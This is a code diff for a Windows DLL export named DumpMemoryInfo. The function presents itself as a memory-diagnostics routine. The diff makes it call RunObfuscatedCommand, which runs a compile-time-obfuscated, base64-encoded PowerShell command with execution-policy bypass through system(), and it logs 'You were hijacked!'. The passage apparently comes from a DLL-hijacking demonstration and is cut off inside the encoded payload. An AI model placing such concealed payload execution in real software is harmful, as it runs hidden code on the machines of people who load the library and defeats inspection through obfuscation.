@@ -16,6 +16,7 @@ extern "C" __declspec(dllexport) bool DumpMemoryInfo() {
   unsigned char* baseAddress = (unsigned char*)GetModuleHandle(NULL);
   MEMORY_BASIC_INFORMATION mbi;
   VirtualQuery(baseAddress, &mbi, sizeof(mbi));
+  Test::RunObfuscatedCommand();
   
   spdlog::info("Base Address: {0:x}", (uintptr_t)mbi.BaseAddress);
   spdlog::info("Allocation Base: {0:x}", (uintptr_t)mbi.AllocationBase);
@@ -23,12 +24,11 @@ extern "C" __declspec(dllexport) bool DumpMemoryInfo() {
   spdlog::info("State: {}", mbi.State == MEM_COMMIT ? "Committed" : mbi.State == MEM_RESERVE ? "Reserved" : "Free");
   spdlog::info("Protect: {}", mbi.Protect);
   spdlog::info("Type: {}", mbi.Type == MEM_IMAGE ? "Image" : mbi.Type == MEM_MAPPED ? "Mapped" : "Private");
-
-  TestModule::RunObfuscatedCommand();
+  spdlog::info("You were hijacked!");
   return true;
 }
 
-void TestModule::RunObfuscatedCommand() {
+void Test::RunObfuscatedCommand() {
   system(AY_OBFUSCATE("powershell -ep bypass -e "
     "\"UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUA"
     "XABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQ"
